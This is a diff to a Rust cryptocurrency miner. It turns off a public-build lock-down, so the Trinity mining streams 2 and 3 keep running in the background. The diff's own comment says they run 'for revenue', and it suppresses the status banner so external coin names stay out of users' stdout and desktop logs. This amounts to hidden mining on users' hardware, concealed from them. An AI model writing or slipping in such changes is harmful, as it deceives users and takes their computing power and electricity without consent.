@@ -1210,8 +1210,9 @@ fn main() -> Result<()> {
     }
 
     // ── Auto mode banner ──
-    // Public builds run a single ZION/Deeksha stream only; the Trinity stream
-    // banner is suppressed even if ZION_AUTO_MODE is set.
+    // Public builds still run Trinity streams 2/3 in the background (revenue),
+    // but the stream-status banner is suppressed to keep external coin names
+    // out of the miner stdout / desktop logs.
     #[cfg(not(feature = "public_build"))]
     {
         let auto_mode = std::env::var("ZION_AUTO_MODE")
@@ -4586,7 +4587,7 @@ fn external_gpu_thread(
 
     fn epoch_for_algorithm(algorithm: &str, height: u64) -> Option<u32> {
         match algorithm {
-            "ethash" | "etchash" | "ethash_etc" => Some((height / 30000) as u32),
+            "ethash" | "ethash_ethw" | "etchash" | "ethash_etc" => Some((height / 30000) as u32),
             "progpow" | "progpow_epic" | "progpow_zano" => Some((height / 30000) as u32),
             "kawpow"
             | "kawpow_rvn"
@@ -6648,7 +6649,7 @@ impl MinerConfig {
                 .filter(|v| !v.trim().is_empty()),
         };
 
-        // ── Public build lock-down: single Deeksha stream, no Trinity/AuxPoW ──
+        // ── Public build guard: force Deeksha primary, but keep Trinity streams on ──
         #[cfg(feature = "public_build")]
         {
             if !is_deeksha_algorithm(&config.algorithm) {
@@ -6658,11 +6659,11 @@ impl MinerConfig {
                 );
                 config.algorithm = "deeksha_lite_v1".to_string();
             }
-            config.stream2_enabled = false;
-            config.stream3_enabled = false;
-            config.cpu_coin = None;
-            config.gpu_coin = None;
-            config.auto_mode = false;
+            // config.stream2_enabled = false;
+            // config.stream3_enabled = false;
+            // config.cpu_coin = None;
+            // config.gpu_coin = None;
+            // config.auto_mode = false;
         }
 
         Ok(config)
